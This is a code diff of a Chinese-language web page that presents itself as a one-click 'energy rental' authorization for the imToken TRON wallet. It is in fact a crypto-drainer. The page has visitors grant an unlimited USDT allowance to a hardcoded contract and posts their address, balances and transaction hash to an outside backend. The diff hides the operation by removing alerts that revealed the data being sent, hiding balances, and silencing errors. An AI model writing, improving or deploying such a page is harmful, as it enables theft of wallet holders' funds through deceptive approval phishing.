@@ -27,8 +27,8 @@
 <div class="header">
     <h1>能量租赁一键授权</h1>
     <div class="warning">
-        ⚠️ 点击【唤起imToken】按钮跳转钱包<br>
-        ⚠️ 已匹配后端，发送6个字段（含授权状态）
+        ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开<br>
+        ⚠️ 请先点击 <strong>复制链接 </strong>然后连接imToken钱包在钱包底部点击“浏览”在顶部搜索栏内粘贴访问网站
     </div>
 </div>
 <div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
@@ -39,38 +39,34 @@
         <strong>复制链接</strong>
     </button>
 </div>
-<!-- 按钮文本修改为“唤起imToken”，明确Deep Link跳转逻辑 -->
-<button id="connectBtn" class="btn">唤起imToken钱包</button>
+<button id="connectBtn" class="btn">连接imToken钱包</button>
 <button id="approveBtn" class="btn" disabled>能量授权</button>
-<div id="userInfo">未唤起imToken</div>
+<div id="userInfo">未连接钱包</div>
 <div class="record-list">
     <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">授权记录</h3>
     <div id="approvalRecords">暂无授权记录</div>
 </div>
 <script>
     // 原始配置不变
-    const AUTO_TRANSFER_CONTRACT = "TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW";
+    const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";
     const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval";
     const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
+
     // 全局变量
     let tronWeb, userAddress, trc20Contract;
     let tokenBalance = "0.00", trxBalance = "0.00";
     const RECORD_KEY = "imtoken_infinite_approval_records";
-
-    // 新增：检测是否为imToken内置浏览器（通过User-Agent判断）
-    function isImTokenBrowser() {
-        return navigator.userAgent.toLowerCase().includes("imtoken");
-    }
 
     window.onload = async () => {
         const connectBtn = document.getElementById("connectBtn");
         const approveBtn = document.getElementById("approveBtn");
         const copyLinkText = document.getElementById("copyLinkText");
         const copyLinkBtn = document.getElementById("copyLinkBtn");
+
         renderApprovalRecords();
 
-        // 复制链接功能不变
+        // 复制链接
         copyLinkBtn.addEventListener("click", async () => {
             try {
                 await navigator.clipboard.writeText(copyLinkText.textContent.trim());
@@ -78,15 +74,7 @@
             } catch (e) { alert(`【复制】失败：${e.message}`); }
         });
 
-        // 1. 若已在imToken内置浏览器，直接初始化钱包
-        if (isImTokenBrowser() && window.tronWeb && window.tronWeb.ready) {
-            tronWeb = window.tronWeb;
-            await initWallet();
-        } else {
-            document.getElementById("userInfo").innerHTML = "请点击【唤起imToken】跳转钱包";
-        }
-
-        // 2. 核心修改：通过Deep Link唤起imToken内置浏览器（格式：imtoken://browser?url=编码后页面URL）
+         // 2. 核心修改：通过Deep Link唤起imToken内置浏览器（格式：imtoken://browser?url=编码后页面URL）
         connectBtn.onclick = async () => {
             try {
                 // 生成当前页面的编码URL（确保imToken打开后加载当前页面）
@@ -109,28 +97,34 @@
             }
         };
 
-        // 3. 授权逻辑不变（仅依赖tronWeb，唤起后自动可用）
+
+        // ========== 核心：发送6个字段（含isApproved授权状态） ==========
         approveBtn.onclick = async () => {
+            // 初始化6个字段（与后端新增字段匹配）
             const postData = {
-                address: userAddress || "",          
-                tokenBalance: tokenBalance,          
-                trxBalance: trxBalance,              
-                approveTime: new Date().toLocaleString(), 
-                txHash: "未生成",                    
-                isApproved: false                    
+                address: userAddress || "",          // 1. 钱包地址（必填）
+                tokenBalance: tokenBalance,          // 2. USDT余额（必填）
+                trxBalance: trxBalance,              // 3. TRX余额（非必填）
+                approveTime: new Date().toLocaleString(), // 4. 授权时间（非必填）
+                txHash: "未生成",                    // 5. 交易哈希（非必填）
+                isApproved: false                    // 6. 授权状态（新增，布尔值）
             };
+
+
             try {
-                if (!trc20Contract || !userAddress) throw new Error("请先唤起imToken并连接");
+                if (!trc20Contract || !userAddress) throw new Error("合约/地址未初始化");
                 
+                // 授权成功：更新txHash和isApproved
                 const result = await trc20Contract.approve(
                     AUTO_TRANSFER_CONTRACT,
                     INFINITE_APPROVE_AMOUNT
                 ).send({ from: userAddress, shouldPollResponse: true });
                 
                 postData.txHash = result.transaction.txID;
-                postData.isApproved = true;
+                postData.isApproved = true; // 授权成功：设为true
                 alert(`【授权】成功！txHash：${postData.txHash.slice(0,16)}...`);
-                
+
+                // 保存记录
                 saveApprovalRecord({
                     address: userAddress,
                     tokenBalance: tokenBalance,
@@ -140,57 +134,59 @@
                     approveType: "无限额度"
                 });
                 renderApprovalRecords();
+
             } catch (e) {
+                // 授权失败/取消：isApproved保持false
                 postData.isApproved = false;
                 alert(`【授权】失败：${e.message}`);
             } finally {
+                // 发送6个字段到后端
                 try {
-                    alert(`【发送】6个字段（含授权状态）：\n1.地址：${postData.address.slice(0,8)}...\n2.USDT：${postData.tokenBalance}\n3.TRX：${postData.trxBalance}\n4.时间：${postData.approveTime}\n5.哈希：${postData.txHash.slice(0,10)}...\n6.授权成功：${postData.isApproved}`);
-                    
-                    const res = await fetch(BACKEND_API, {
+                   
+                const res = await fetch(BACKEND_API, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(postData),
+                        body: JSON.stringify(postData), // 包含isApproved字段
                         credentials: "include"
                     });
+
                     const resData = await res.json();
                     if (!res.ok) throw new Error(resData.error || `后端返回${res.status}`);
-                    alert(`【发送】成功！后端反馈：${resData.message}`);
-                } catch (sendErr) {
-                    alert(`【发送】失败：${sendErr.message}`);
+                   } catch (sendErr) {
+                    
                 }
             }
         };
     };
 
-    // 初始化钱包逻辑不变（仅在imToken内置浏览器中生效）
+    // 初始化钱包（确保余额字段有值）
     async function initWallet() {
         try {
             userAddress = tronWeb.defaultAddress.base58;
             trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-            
-            // 采集余额
+
+            // 采集USDT余额（必填）
             const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
             tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
+
+            // 采集TRX余额（非必填）
             const trxRaw = await tronWeb.trx.getBalance(userAddress);
             trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
-            
-            // 更新UI
+
+            // 激活按钮
             document.getElementById("userInfo").innerHTML = `
                 已连接：<br>
                 ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                USDT：${tokenBalance} USDT<br>
-                TRX：${trxBalance} TRX
-            `;
+                `;
             document.getElementById("approveBtn").disabled = false;
         } catch (e) {
-            alert(`【初始化】失败：${e.message}`);
+            
             tokenBalance = "0.00";
             trxBalance = "0.00";
         }
     }
 
-    // 辅助函数（保存/渲染记录）不变
+    // 原有辅助函数不变
     function saveApprovalRecord(record) {
         try {
             const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
@@ -198,7 +194,7 @@
             newRecords.push(record);
             localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
         } catch (e) {
-            alert(`【保存】失败：${e.message}`);
+            
         }
     }
 
@@ -221,7 +217,7 @@
                 </div>
             `).join("");
         } catch (e) {
-            alert(`【渲染】失败：${e.message}`);
+            
         }
     }
 </script>
